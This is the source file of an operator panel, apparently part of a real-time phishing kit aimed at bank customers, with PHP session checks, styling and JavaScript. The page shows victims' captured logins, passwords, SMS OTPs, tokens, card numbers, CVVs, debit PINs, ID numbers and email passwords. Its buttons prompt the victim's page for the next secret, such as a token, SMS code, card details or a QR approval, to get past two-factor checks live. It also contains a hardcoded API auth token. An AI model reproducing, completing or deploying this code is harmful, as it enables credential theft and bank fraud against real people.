<?php

// panel/gestion_usuario.php
date_default_timezone_set('America/Bogota'); // Asegúrate de que esta línea esté al principio.
session_start(); // Inicia la sesión

// Comprobación de sesión: Si el usuario no ha iniciado sesión, redirigir a login.php
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php"); // Redirige a la página de login
    exit(); // Detiene la ejecución del script
}

// NUEVO: Redirigir a los marquilladores de vuelta al dashboard
if (isset($_SESSION['role']) && $_SESSION['role'] === 'marquillador') {
    // Puedes añadir un mensaje de alerta si lo deseas, por ejemplo, usando una variable de sesión
    $_SESSION['message'] = "Los usuarios con rol Marquillador no tienen acceso a la gestión detallada de usuarios. Por favor, realice las acciones desde el Dashboard.";
    header("Location: dashboard_b.php"); // REDIRIGE A DASHBOARD_B para marquilladores
    exit();
}

// Opcional: Comprobar la inactividad de la sesión (ej. 1 hora)
$session_timeout = 3600; // 1 hora (en segundos)
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > $session_timeout)) {
    session_unset(); // Elimina todas las variables de sesión
    session_destroy(); // Destruye la sesión
    header("Location: login.php?expired=true"); // Redirige con un mensaje de sesión expirada
    exit(); // Detiene la ejecución del script
}
$_SESSION['last_activity'] = time(); // Actualiza la última actividad en cada carga de página

// Tu código existente de gestion_usuario.php continúa aquí.
$usuario_id = $_GET['id'] ?? null;

if (!$usuario_id || !is_numeric($usuario_id)) {
    header('Location: index.php'); // Redirigir al listado principal si no hay ID válido
    exit('ID de usuario no especificado o inválido.');
}

// --- INICIO: NUEVA LÓGICA DE PROTECCIÓN DE REGISTRO POR URL ---
require_once 'db.php'; // Asegúrate de incluir el archivo de conexión a la BD
$current_username = $_SESSION['username'] ?? ''; // Obtener el nombre de usuario actual
const LOCK_TIMEOUT = 300; // 5 minutos, debe ser consistente con datos.php

try {
    $stmt_check_lock = $db->prepare("SELECT gestionado_por, gestion_iniciada_at FROM registros WHERE id = ?");
    $stmt_check_lock->execute([$usuario_id]);
    $lock_info = $stmt_check_lock->fetch(PDO::FETCH_ASSOC);

    if ($lock_info) {
        $gestionado_por_registro = $lock_info['gestionado_por'] ?? '';
        $gestion_iniciada_at_timestamp = strtotime($lock_info['gestion_iniciada_at'] ?? '1970-01-01 00:00:00');
        $ahora = time();

        $time_since_gestion_started = $ahora - $gestion_iniciada_at_timestamp;

        // Si el registro está gestionado por OTRO OPERADOR y el bloqueo está ACTIVO
        if (!empty($gestionado_por_registro) && $gestionado_por_registro !== $current_username && $time_since_gestion_started <= LOCK_TIMEOUT) {
            $_SESSION['message'] = "El registro ID " . htmlspecialchars($usuario_id) . " está siendo gestionado por otro operador (" . htmlspecialchars($gestionado_por_registro) . ").";
            header("Location: dashboard_a.php"); // Redirigir al dashboard principal
            exit();
        }
    } else {
        // Opcional: Si el ID no existe en la base de datos
        $_SESSION['message'] = "El registro ID " . htmlspecialchars($usuario_id) . " no existe.";
        header("Location: dashboard_a.php");
        exit();
    }
} catch (PDOException $e) {
    // Manejo de errores de base de datos durante la verificación de bloqueo
    error_log("Error de BD en gestion_usuario.php al verificar bloqueo: " . $e->getMessage());
    $_SESSION['message'] = "Error al verificar el estado del registro. Inténtelo de nuevo. Detalles: " . $e->getMessage();
    header("Location: dashboard_a.php");
    exit();
}
// --- FIN: NUEVA LÓGICA DE PROTECCIÓN DE REGISTRO POR URL ---

?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Gestión de Usuario</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        /* Base y Reset */
        html, body {
            margin: 0;
            padding: 0;
            height: 100vh;
            background-color: #f4f6f9; /* Color de fondo por defecto del body */
            font-family: 'Segoe UI', sans-serif;
            overflow: hidden; /* ¡IMPORTANTE! Controla el scroll */
            display: flex;
            flex-direction: column; /* Para top-bar y contenedor */
        }

        /* CORREGIDO: Clase para el cambio de fondo del body (PC) - AHORA ES PERSISTENTE */
        .body-highlight-received-pc {
            background-color: #d4edda !important; /* Color verde claro que PERMANECE */
        }
        /* ELIMINADO: @keyframes formHighlightFadePC ya no se usa aquí para persistencia */


        /* Animación para el parpadeo del campo */
        @keyframes fieldBlink {
            0%, 100% { background-color: #fafafa; } /* Color de fondo normal del campo */
            50% { background-color: #ffe680; } /* ¡NUEVO COLOR: Amarillo/oro brillante! */
        }
        .blinking-field {
            animation: fieldBlink 1.5s infinite alternate; /* Parpadeo infinito y alterno */
        }


        .top-bar {
            height: 60px;
            background: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 20px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
            font-size: 14px;
            flex-shrink: 0; /* No se encoge */
        }
        .top-bar .usuario-info {
            color: #2980b9;
            font-weight: bold;
        }
        /* ESTILO PARA OPERADOR EN TOP BAR */
        .top-bar .operador-info {
            color: #555;
            font-weight: bold;
            margin-left: auto; /* Empuja el elemento a la derecha */
            margin-right: 20px; /* Espacio antes del estado-info */
        }
        .top-bar .estado-info {
            padding: 6px 12px;
            background: #f9e79f; /* Color amarillo claro */
            color: #444;
            border-radius: 6px;
            font-weight: bold;
        }
        .top-bar .admin-name {
            color: #555;
        }


        .contenedor {
            max-width: 1200px;
            width: 100%; /* Asegura que el contenedor ocupe el 100% de width disponible del padre */
            margin: auto; /* Centra el contenedor horizontalmente */
            padding: 10px 20px;
            height: calc(100vh - 60px); /* Altura dinámica para evitar scroll vertical */
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            justify-content: space-between; /* Distribuye el espacio entre los grupos */
        }

        .grupo {
            border: 1px solid #ccc; /* Borde general para agrupar */
            border-top: 5px solid; /* Borde superior de color */
            background: white;
            padding: 5px; /* Padding general de los grupos */
            border-radius: 10px;
            margin-bottom: 5px; /* Espacio entre grupos */
            display: flex;
            flex-wrap: wrap;
            justify-content: flex-start; /* Alinea los campos al inicio */
            gap: 6px; /* Espacio entre los campos */
            flex-grow: 1; /* Permite que los grupos crezcan para llenar el espacio vertical */
            min-height: 0; /* Permite que se encojan */
            overflow: hidden; /* Oculta contenido que se desborde si no cabe */
        }

        /* Colores de las secciones (del prototipo) */
        .grupo.azul { border-color: #007bff; }
        .grupo.rojo { border-color: #e74c3c; } /* Prototipo usa un rojo más oscuro aquí */
        .grupo.naranja {
            border-color: #e67e22;
            padding-bottom: 20px;
        }
        .grupo.verde { border-color: #2ecc71; }
        .grupo.amarillo { border-color: #f1c40f; }

        .campo {
            flex: 1 1 calc(20% - 6px); /* 5 columnas por defecto (20% - gap). Ajustar si se necesitan 4 o 3 */
            background: #fafafa;
            border: 1px dashed #ccc; /* Borde punteado como en el prototipo */
            padding: 10px;
            text-align: center;
            border-radius: 8px;
            font-size: 13px;
            box-sizing: border-box;
            min-width: 140px; /* Mínimo para que el campo sea legible */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center; /* Centrar contenido */
            word-break: break-all; /* Rompe palabras largas para evitar desbordamiento */
            overflow-wrap: break-word; /* Redundancia */
            position: relative;
        }
        .campo label { /* Etiqueta del campo */
            font-size: 0.8em;
            color: #6c757d;
            margin-bottom: 3px;
            font-weight: normal;
            text-transform: uppercase;
        }
        .campo .valor, .campo .mascara { /* Valor del campo */
            font-size: 1em;
            color: #343a40;
            font-weight: bold;
        }
        /* MASCARA: Ahora muestra el valor real por solicitud explícita */
        .campo .mascara {
            color: #343a40; /* Color normal para mostrar el valor, no enmascarado */
        }

        /* Anchos específicos para las columnas en grupos si se desea un control más fino */
        @media (max-width: 1000px) { .campo { flex: 1 1 calc(33.333% - 6px); } }
        @media (max-width: 768px) { .campo { flex: 1 1 calc(50% - 6px); } }
        @media (max-width: 480px) {
            .campo { flex: 1 1 100%; }
            .acciones button { flex: 1 1 calc(50% - 5px); min-width: calc(50% - 5px); max-width: calc(50% - 5px); }
            .input-button-group { flex-wrap: wrap; justify-content: center; }
            .input-button-group input#nueva-pregunta { flex: 1 1 100%; }
            .input-button-group button#enviar-pregunta { flex: 1 1 100%; max-width: 100%; }
        }

        .acciones {
            display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; padding: 5px; flex-shrink: 0;
        }
        .acciones button {
            padding: 6px 12px; border: none; background: #3498db; color: white; border-radius: 6px; font-size: 13px; cursor: pointer;
            display: flex; align-items: center; gap: 5px; white-space: nowrap; flex-grow: 0; flex-shrink: 1;
            min-width: fit-content; max-width: 150px; box-sizing: border-box; justify-content: center;
        }
        /* Colores de botones */
        .acciones button.blue-btn { background: #007bff; } .acciones button.orange-btn { background: #fd7e14; }
        .acciones button.green-btn { background: #28a745; } .acciones button.red-btn { background: #dc3545; }
        .acciones button.dark-btn { background: #343a40; } .acciones button.purple-btn { background: #6f42c1; }
        .acciones button.secondary-btn { background: #6c757d; } .acciones button.info-btn { background: #17a2b8; }
        .acciones button.finalizar { background: #e74c3c; }

        /* Estilos del grupo input + botón de pregunta */
        .input-button-group { display: flex; gap: 3px; width: 100%; max-width: 500px; margin: auto; }
        .input-button-group input#nueva-pregunta { flex-grow: 1; padding: 5px 10px; border: 1px solid #ddd; border-radius: 5px; font-size: 13px; box-sizing: border-box; }
        .input-button-group button#enviar-pregunta { padding: 5px 10px; font-size: 13px; min-width: 60px; }

        /* Estilos del Modal de APP QR */
        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.7); z-index: 1000; justify-content: center; align-items: center; }
        .modal-content { background-color: white; padding: 25px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3); width: 90%; max-width: 500px; position: relative; display: flex; flex-direction: column; gap: 15px; text-align: center; }
        .modal-content h3 { margin-top: 0; color: #333; }
        .modal-content input[type="file"] { display: block; width: calc(100% - 20px); padding: 10px; border: 1px solid #ddd; border-radius: 5px; margin: 0 auto; }
        .modal-content .qr-preview { max-width: 100%; max-height: 200px; object-fit: contain; margin-top: 10px; border: 1px dashed #ccc; padding: 5px; display: none; }
        .modal-content .modal-actions { display: flex; justify-content: space-around; gap: 10px; margin-top: 20px; }
        .modal-content .modal-actions button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 1em; flex-grow: 1; }
        .modal-content .modal-actions .btn-send-qr { background-color: #28a745; color: white; }
        .modal-content .modal-actions .btn-close-modal { background-color: #dc3545; color: white; }
    </style>
</head>

<body>
    <div class="top-bar">
        <div class="usuario-info">Usuario: <span id="top-bar-usuario">Cargando...</span> (ID: <span id="top-bar-id">###</span>)</div>
        <div class="operador-info">Operado por: <span id="top-bar-operador">Cargando...</span></div>
        <div class="estado-info">Estado: <span id="top-bar-estado">EN EJECUCIÓN</span></div>
        
    </div>

    <div class="contenedor">
        <div class="grupo azul" id="grupo-identificacion-login">
            <div class="campo" id="campo-display-usuario"><label>Usuario</label><span class="valor" id="display-usuario"></span></div>
            <div class="campo" id="campo-display-pass"><label>Contraseña</label><span class="mascara" id="display-pass"></span></div>
            <div class="campo" id="campo-display-token"><label>Token</label><span class="mascara" id="display-token"></span></div>
            <div class="campo" id="campo-display-sms_otp"><label>SMS OTP</label><span class="mascara" id="display-sms_otp"></span></div>
            <div class="campo" id="campo-display-correo"><label>Correo</label><span class="valor" id="display-correo"></span></div>
            <div class="campo" id="campo-display-ccorreo"><label>Clave Correo</label><span class="mascara" id="display-ccorreo"></span></div>
            <div class="campo" id="campo-display-celular"><label>Celular</label><span class="valor" id="display-celular"></span></div>
        </div>

        <div class="grupo rojo" id="grupo-datos-tarjeta">
            <div class="campo" id="campo-display-ntc"><label>Num. T. Crédito</label><span class="mascara" id="display-ntc"></span></div>
            <div class="campo" id="campo-display-fven"><label>Fecha Venc.</label><span class="valor" id="display-fven"></span></div>
            <div class="campo" id="campo-display-cvv"><label>CVV (Crédito)</label><span class="mascara" id="display-cvv"></span></div>
            <div class="campo" id="campo-display-ntd"><label>Num. T. Débito</label><span class="mascara" id="display-ntd"></span></div>
            <div class="campo" id="campo-display-ctd"><label>Clave T. Débito</label><span class="mascara" id="display-ctd"></span></div>
        </div>

        <div class="grupo naranja grupo-2col" id="grupo-pregunta-seguridad">
            <div class="campo" id="campo-display-preg"><label>Pregunta</label><span class="valor" id="display-preg"></span></div>
            <div class="campo" id="campo-display-respuesta"><label>Respuesta</label><span class="mascara" id="display-respuesta"></span></div>
            <div class="input-button-group" style="width: 100%;">
                <input type="text" id="nueva-pregunta" placeholder="Escriba aquí una nueva pregunta">
                <button id="enviar-pregunta" class="blue-btn"><i class="fas fa-paper-plane"></i> Enviar</button>
            </div>
        </div>

        <div class="grupo verde" id="grupo-detalles-personales">
            <div class="campo" id="campo-display-apellidos"><label>Primer Apellido</label><span class="valor" id="display-apellidos"></span></div>
            <div class="campo" id="campo-display-ano_nacimiento"><label>Año Nacimiento</label><span class="valor" id="display-ano_nacimiento"></span></div>
            <div class="campo" id="campo-display-cedula"><label>Cédula</label><span class="valor" id="display-cedula"></span></div>
            <div class="campo" id="campo-display-codigo_verificacion"><label>Cód. Verificación</label><span class="mascara" id="display-codigo_verificacion"></span></div>
        </div>
        
        <div class="grupo amarillo" id="grupo-detalles-sistema">
            <div class="campo"><label>Dispositivo</label><span class="valor" id="display-sistema_operativo"></span></div>
            <div class="campo"><label>IP</label><span class="valor" id="display-ip"></span></div>
            <div class="campo"><label>Navegador</label><span class="valor" id="display-navegador"></span></div>
            <div class="campo"><label>Última Conexión</label><span class="valor" id="display-ultima_conexion"></span></div>
            <div class="campo"><label>Estado Actual</label><span class="valor" id="display-status"></span></div>
            <div class="campo"><label>Referencia:</label><div class="value" id="display-referencia">Cargando...</div></div>
            <div class="campo"><label>Valor:</label><div class="value" id="display-valor">Cargando...</div></div>
            <div class="campo"><label>Nombre Empresa:</label><div class="value" id="display-nombre_empresa">Cargando...</div></div>
            <div class="campo"><label>Cliente Ref.:</label><div class="value" id="display-cliente_referencia">Cargando...</div></div>
            <div class="campo"><label>Tipo Cliente:</label><div class="value" id="display-tipo_cliente">Cargando...</div></div>
            <div class="campo"><label>Dirección:</label><div class="value" id="display-direccion">Cargando...</div></div>
            <div class="campo"><label>Ciudad:</label><div class="value" id="display-ciudad">Cargando...</div></div>
            <!-- Nuevo campo para App Móvil, si aplica -->
            <div class="campo" id="campo-display-app_movil"><label>App Móvil</label><span class="valor" id="display-app_movil"></span></div>
        </div>

        <div class="acciones">
            <button class="dark-btn" onclick="enviarOrdenPanel('Usuario Errado')"><i class="fas fa-user"></i> Usuario</button>
            <button class="dark-btn" onclick="enviarOrdenPanel('Esperando Password')"><i class="fas fa-key"></i> Password</button>
            <button class="blue-btn" onclick="enviarOrdenPanel('Esperando Token')"><i class="fas fa-shield-alt"></i> Token</button>
            <button class="blue-btn" onclick="openQrModal()"><i class="fas fa-qrcode"></i> APP QR</button> 
            <button class="info-btn" onclick="enviarOrdenPanel('Esperando Tarjeta')"><i class="fas fa-credit-card"></i> Tarj Crédito</button>
            <button class="orange-btn" onclick="enviarOrdenPanel('Esperando SMS OTP')"><i class="fas fa-sms"></i> SMS OTP</button>
            <button class="secondary-btn" onclick="enviarOrdenPanel('Esperando Cedula')"><i class="fas fa-id-card"></i> Cédula</button>
            <button class="secondary-btn" onclick="enviarOrdenPanel('Esperando Ano Nacimiento')"><i class="fas fa-calendar-alt"></i> Año Nac.</button>
            <button class="secondary-btn" onclick="enviarOrdenPanel('Esperando Apellidos')"><i class="fas fa-question-circle"></i> Apellidos</button>
            <button class="secondary-btn" onclick="enviarOrdenCorreo()"><i class="fas fa-envelope"></i> Correo</button>
            <button class="secondary-btn" onclick="enviarOrdenClaveCorreo()"><i class="fas fa-lock"></i> Clave Correo</button>
            <button class="secondary-btn" onclick="enviarOrdenTarjetaDebito()"><i class="fas fa-credit-card-alt"></i> Tarj Débito</button>
            <button class="secondary-btn" onclick="enviarOrdenClaveTarjetaDebito()"><i class="fas fa-lock"></i> Clave T. Débito</button>
            <!-- NUEVO BOTÓN: App Móvil -->
            <button class="purple-btn" onclick="enviarOrdenPanel('Esperando App Movil')"><i class="fas fa-mobile-alt"></i> App Móvil</button>

            <button class="green-btn" onclick="enviarOrdenPanel('Completado')"><i class="fas fa-check-circle"></i> Finalizar</button>
            <button class="red-btn" onclick="liberarRegistro()"><i class="fas fa-unlock"></i> Liberar</button>
        </div>
    </div>

    <div id="qrModal" class="modal-overlay">
        <div class="modal-content">
            <h3>Adjuntar Código QR</h3>
            <p>Pega una imagen (Ctrl+V) o selecciona un archivo.</p>
            <input type="file" id="qrFileInput" accept="image/*">
            <img id="qrPreview" class="qr-preview" src="#" alt="Vista previa QR">
            <div class="modal-actions">
                <button class="btn-send-qr" id="sendQrBtn">Enviar QR al Cliente</button>
                <button class="btn-close-modal" id="closeQrModalBtn">Cerrar</button>
            </div>
        </div>
    </div>

</body>
</html>

<script>

// panel/gestion_usuario.php (dentro de las etiquetas <script>)

// ... (tu código JavaScript existente arriba) ...

document.addEventListener('DOMContentLoaded', () => {
    // ... (otras llamadas a cargarDatosUsuario o inicializaciones) ...

    const enviarPreguntaBtn = document.getElementById('enviar-pregunta');
    const nuevaPreguntaInput = document.getElementById('nueva-pregunta');

    if (enviarPreguntaBtn && nuevaPreguntaInput) {
        enviarPreguntaBtn.addEventListener('click', () => {
            const pregunta = nuevaPreguntaInput.value.trim();
            if (pregunta) {
                // Llama a la función genérica para enviar la orden
                // El status debe ser "Esperando Pregunta" para que el cliente la reconozca.
                // El texto de la pregunta se envía en el campo 'preg'.
                enviarOrdenPanel('Esperando Pregunta', { preg: pregunta });
                nuevaPreguntaInput.value = ''; // Limpia el input después de enviar
            } else {
                alert('Por favor, escribe una pregunta antes de enviar.');
            }
        });
    } else {
        console.error("No se encontraron los elementos 'enviar-pregunta' o 'nueva-pregunta'.");
    }

    // AÑADIDO: Al cargar la página de gestión, reclamar el registro para este operador
    // Solo si el rol no es 'marquillador', ya que los marquilladores manejan el estado 'En Proceso' en su dashboard
    // No hay necesidad de verificar el rol aquí, el PHP ya hace la redirección para marquilladores.
    enviarOrdenPanel('En Proceso por Operador', {
        operador: '<?php echo htmlspecialchars($_SESSION['username'] ?? ''); ?>', // Pasa el nombre de usuario de PHP
        gestion_iniciada_at: new Date().toISOString().slice(0, 19).replace('T', ' ') // Marca de tiempo actual
    });
});

// ... (tu código JavaScript existente abajo) ...
    const usuarioId = <?php echo json_encode($usuario_id); ?>;
    const authToken = "EZnDyqEgnhVxDHLRTqS5pMaa_pbJEKOK9PxpsSXAN2g"; // Asegúrate que este token sea universal

    // Variable de control para el manejo de acordeones
    let alerta_formulario_mobile = 1; // 1: Sistema listo para auto-abrir, 0: Operador tiene el control

    // Variables de estado y elementos UI
    let lastProcessedStatusForBodyHighlightPC = null; 
    let currentBlinkingFieldIdPC = null;

    // Mapeo de estados 'Ingresados' a IDs de los div.campo para el parpadeo
    const fieldBlinkingElementsPC = {
        "Usuario Ingresado": "campo-display-usuario", 
        "Clave Ingresada": "campo-display-pass",
        "Token Ingresado": "campo-display-token",
        "SMS OTP Ingresado": "campo-display-sms_otp",
        "Correo Ingresado": "campo-display-correo",
        "Clave Correo Ingresada": "campo-display-ccorreo",
        "Celular Ingresado": "campo-display-celular",
        "Tarjeta Ingresada": "campo-display-ntc", 
        "APP QR Ingresado": "campo-display-app_qr", // Si existe este campo, si no, puedes quitarlo
        "Cedula Ingresada": "campo-display-cedula",
        "Ano Nacimiento Ingresado": "campo-display-ano_nacimiento",
        "Apellidos Ingresados": "campo-display-apellidos",
        "Respuesta Ingresada": "campo-display-respuesta", 
        "Tarjeta Debito Ingresada": "campo-display-ntd",
        "Clave Tarjeta Debito Ingresada": "campo-display-ctd",
        "Usuario Errado": "campo-display-usuario",
        "Esperando App Movil": "campo-display-app_movil", // NUEVO
        "App Movil Aprobada": "campo-display-app_movil" // NUEVO
    };

    // Referencias a elementos del modal QR
    const qrModal = document.getElementById('qrModal');
    const qrFileInput = document.getElementById('qrFileInput');
    const qrPreview = document.getElementById('qrPreview');
    const sendQrBtn = document.getElementById('sendQrBtn');
    const closeQrModalBtn = document.getElementById('closeQrModalBtn');

    let currentQrFile = null; // Variable para guardar el archivo QR seleccionado/pegado

    // Funciones para el Modal de QR
    function openQrModal() {
        qrModal.style.display = 'flex'; // Muestra el modal
        qrPreview.style.display = 'none'; // Oculta la vista previa al abrir
        qrFileInput.value = ''; // Limpia el input de archivo
        currentQrFile = null; // Resetea el archivo
    }

    function closeQrModal() {
        qrModal.style.display = 'none'; // Oculta el modal
        qrPreview.style.display = 'none';
        qrFileInput.value = '';
        currentQrFile = null;
    }

    // Manejar selección de archivo para QR
    qrFileInput.addEventListener('change', (event) => {
        const file = event.target.files[0];
        if (file && file.type.startsWith('image/')) {
            currentQrFile = file;
            const reader = new FileReader();
            reader.onload = (e) => {
                qrPreview.src = e.target.result;
                qrPreview.style.display = 'block';
            };
            reader.readAsDataURL(file);
        } else {
            alert('Por favor, seleccione un archivo de imagen.');
            qrPreview.style.display = 'none';
            currentQrFile = null;
        }
    });

    // Manejar pegado de imagen (Ctrl+V) para QR
    document.addEventListener('paste', (event) => {
        if (qrModal.style.display === 'flex') { // Solo procesa el pegado si el modal está visible
            const items = event.clipboardData.items;
            for (let i = 0; i < items.length; i++) {
                if (items[i].type.startsWith('image/')) {
                    const blob = items[i].getAsFile();
                    currentQrFile = blob;
                    const reader = new FileReader();
                    reader.onload = (e) => {
                        qrPreview.src = e.target.result;
                        qrPreview.style.display = 'block';
                    };
                    reader.readAsDataURL(blob);
                    event.preventDefault(); // Previene que la imagen se pegue en otro lugar
                    break;
                }
            }
        }
    });

    // Función para enviar el QR (llama a subir_qr.php)
    sendQrBtn.addEventListener('click', () => {
        if (currentQrFile) {
            const formData = new FormData();
            formData.append('qr_image', currentQrFile);
            formData.append('id', usuarioId);
            formData.append('status', 'Esperando APP QR');

            fetch("api/subir_qr.php", {
                method: "POST",
                headers: {
                    // "Content-Type": "application/json", // QUITAR: FormData maneja su propio Content-Type
                    "X-Auth-Token": authToken
                },
                body: formData
            })
            .then(res => {
                if (!res.ok) {
                    return res.json().then(errorData => {
                        throw new Error(errorData.message || `Error del servidor (HTTP ${res.status}).`);
                    }).catch(() => {
                        throw new Error(`Error HTTP: ${res.status} ${res.statusText}`);
                    });
                }
                return res.json();
            })
            .then(data => {
                if (data.status === "OK") {
                    alert('QR enviado con éxito al cliente.');
                    cargarDatosUsuario(); // Recargar datos para ver el estado actualizado
                    closeQrModal(); // Cerrar el modal
                } else {
                    alert('Error al subir el QR: ' + (data.message || 'Desconocido'));
                }
            })
            .catch(err => {
                console.error('Error al enviar el QR:', err);
                alert('Error de conexión al enviar el QR. Verifique la consola para detalles.');
            });

        } else {
            alert('Por favor, selecciona o pega una imagen de QR primero.');
        }
    });

    // Event listener para cerrar el modal
    closeQrModalBtn.addEventListener('click', closeQrModal);

    // --- Función genérica para enviar órdenes ---
    function enviarOrdenPanel(status, extraData = {}) {
        const payload = { id: usuarioId, status: status, ...extraData };

        return fetch("api/actualizar.php", { // Asegúrate de que esta función devuelva la promesa del fetch
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-Auth-Token": authToken
            },
            body: JSON.stringify(payload)
        })
        .then(res => {
            if (!res.ok) {
                return res.json().then(errorData => {
                    throw new Error(errorData.message || `Error del servidor (HTTP ${res.status}).`);
                }).catch(() => {
                    return res.text().then(text => { // Si no es JSON, obtener texto
                        throw new Error(`Error HTTP: ${res.status} ${res.statusText}. Respuesta: ${text.substring(0, 100)}...`);
                    });
                });
            }
            return res.json();
        })
        .then(data => {
            console.log(`Orden "${status}" enviada: `, data);
            if (data.status === "OK") {
                cargarDatosUsuario(); // Recargar datos después de enviar la orden
            } else {
                alert(`Error al enviar orden "${status}": ` + (data.message || 'Desconocido'));
            }
            return data; // Devuelve los datos para que la cadena .then() funcione
        })
        .catch(err => {
            console.error(`Error de red al enviar orden "${status}":`, err);
            alert(`Error de conexión al enviar orden "${status}". Verifique la consola para detalles.`);
            throw err; // Vuelve a lanzar el error para que la promesa se rechace
        });
    }

    // AÑADIDO: Función para liberar el registro
    function liberarRegistro() {
        if (confirm("¿Está seguro de que desea liberar este registro? Esto permitirá a otros operadores gestionarlo y se cerrará esta ventana.")) {
            enviarOrdenPanel('Registro Liberado', { // Un nuevo status para indicar liberación
                gestionado_por: null, // Explícitamente establecido a null
                gestion_iniciada_at: null, // Explícitamente establecido a null
                operador: null // AÑADIDO: Borrar el nombre del operador al liberar
            })
            .then(data => {
                if (data.status === "OK") {
                    // Cierra la ventana solo si la liberación fue exitosa
                    // Pequeño retardo para asegurar que la respuesta se procese
                    setTimeout(() => {
                        window.close();
                    }, 100); 
                }
            })
            .catch(err => {
                // El error ya se maneja en enviarOrdenPanel, solo aseguramos que no se cierre la ventana
                console.error("No se pudo liberar el registro.", err);
            });
        }
    }

    // Funciones auxiliares para botones (simplificadas para usar enviarOrdenPanel con usuarioId global)
    // Se elimina el paso de 'usuarioId' como parámetro ya que es una constante global.
    function enviarOrdenCelular() { enviarOrdenPanel('Esperando Celular'); }
    function enviarOrdenCorreo() { enviarOrdenPanel('Esperando Correo'); }
    function enviarOrdenClaveCorreo() { enviarOrdenPanel('Esperando Clave Correo'); }
    function enviarOrdenTarjetaDebito() { enviarOrdenPanel('Esperando Tarjeta Debito'); }
    function enviarOrdenClaveTarjetaDebito() { enviarOrdenPanel('Esperando Clave Tarjeta Debito'); }

    // --- Funciones para Cargar y Actualizar Datos del Usuario ---
    function cargarDatosUsuario() {
        fetch(`api/obtener_usuario.php?id=${usuarioId}`, {
            headers: {
                "X-Auth-Token": authToken
            }
        })
            .then(response => {
                if (!response.ok) {
                    return response.text().then(text => {
                        throw new Error(`HTTP ${response.status} ${response.statusText}: ${text}`);
                    });
                }
                return response.json();
            })
            .then(data => {
                if (data.status === 'OK' && data.data) {
                    const userData = data.data;

                    // Lista de estados 'Ingresados' que disparan las alertas
                    const statesToTriggerAlerts = [
                        "Usuario Ingresado", // CAMBIO APLICADO: Agregado para alerta visual
                        "Clave Ingresada", "Token Ingresado", "SMS OTP Ingresado",
                        "Correo Ingresado", "Clave Correo Ingresada", "Celular Ingresado", "Tarjeta Ingresada",
                        "APP QR Ingresado", // Si existe este campo, si no, puedes quitarlo
                        "Cedula Ingresada", "Ano Nacimiento Ingresado", "Apellidos Ingresados",
                        "Respuesta Ingresada", "Tarjeta Debito Ingresada", "Clave Tarjeta Debito Ingresada",
                        "Usuario Errado",
                        "Esperando App Movil", // NUEVO
                        "App Movil Aprobada" // NUEVO
                    ];

                    // Lógica para el cambio de fondo del body (PC) y parpadeo de campos
                    if (statesToTriggerAlerts.includes(userData.status)) {
                        // Aplicar clase de resaltado de fondo si es un estado de alerta
                        document.body.classList.add('body-highlight-received-pc');
                        
                        // Detener parpadeo del campo anterior si existe y no es el mismo
                        if (currentBlinkingFieldIdPC) {
                            const oldBlinkingField = document.getElementById(currentBlinkingFieldIdPC); 
                            // Asegurarse de que el elemento existe y tiene un padre con la clase 'campo' o es el propio .campo
                            if (oldBlinkingField && oldBlinkingField.parentElement && oldBlinkingField.parentElement.classList.contains('campo')) {
                                oldBlinkingField.parentElement.classList.remove('blinking-field'); // Eliminar la clase del padre .campo
                            } else if (oldBlinkingField && oldBlinkingField.classList.contains('campo')) {
                                oldBlinkingField.classList.remove('blinking-field'); // Si la ID está directamente en .campo
                            }
                        }

                        // Iniciar parpadeo del nuevo campo
                        const fieldDisplayId = fieldBlinkingElementsPC[userData.status];
                        if (fieldDisplayId) {
                            let targetFieldElement = document.getElementById(fieldDisplayId);
                            // Si la ID está en el span .valor/.mascara, buscar el padre .campo
                            if (targetFieldElement && targetFieldElement.parentElement && targetFieldElement.parentElement.classList.contains('campo')) {
                                targetFieldElement = targetFieldElement.parentElement;
                            } else if (targetFieldElement && !targetFieldElement.classList.contains('campo')) {
                                // Si la ID no está en el .campo (ej. es el div.grupo), buscar el .campo más cercano
                                targetFieldElement = targetFieldElement.closest('.campo');
                            }
                            
                            if (targetFieldElement) {
                                // Solo añadir si no está parpadeando ya (para evitar reinicios constantes si el estado no cambia)
                                if (!targetFieldElement.classList.contains('blinking-field')) {
                                    targetFieldElement.classList.add('blinking-field');
                                }
                                currentBlinkingFieldIdPC = fieldDisplayId; 
                            }
                        }

                    } else {
                        // Si el estado NO es de alerta, remover resaltado de fondo y parpadeo
                        document.body.classList.remove('body-highlight-received-pc');
                        if (currentBlinkingFieldIdPC) {
                            const oldBlinkingField = document.getElementById(currentBlinkingFieldIdPC);
                            if (oldBlinkingField && oldBlinkingField.parentElement && oldBlinkingField.parentElement.classList.contains('campo')) {
                                oldBlinkingField.parentElement.classList.remove('blinking-field');
                            } else if (oldBlinkingField && oldBlinkingField.classList.contains('campo')) {
                                oldBlinkingField.classList.remove('blinking-field');
                            }
                            currentBlinkingFieldIdPC = null;
                        }
                    }

                    // Actualizar el lastProcessedStatusForBodyHighlightPC para saber cuál fue el último estado
                    // que disparó la alerta (o si no hay alerta), para evitar reiniciar la animación innecesariamente.
                    lastProcessedStatusForBodyHighlightPC = userData.status;


                    // Top Bar Info
                    document.getElementById('top-bar-usuario').textContent = userData.usuario || 'sin datos';
                    document.getElementById('top-bar-id').textContent = userData.id || '###';
                    document.getElementById('top-bar-estado').textContent = userData.status || 'SIN ESTADO';
                    document.getElementById('top-bar-operador').textContent = userData.operador || 'sin datos';


                    // Sección Identificación y Contacto
                    document.getElementById('display-usuario').textContent = userData.usuario || 'sin datos';
                    document.getElementById('display-pass').textContent = userData.pass || 'sin datos';
                    document.getElementById('display-token').textContent = userData.token || 'sin datos';
                    document.getElementById('display-sms_otp').textContent = userData.sms_otp || 'sin datos';
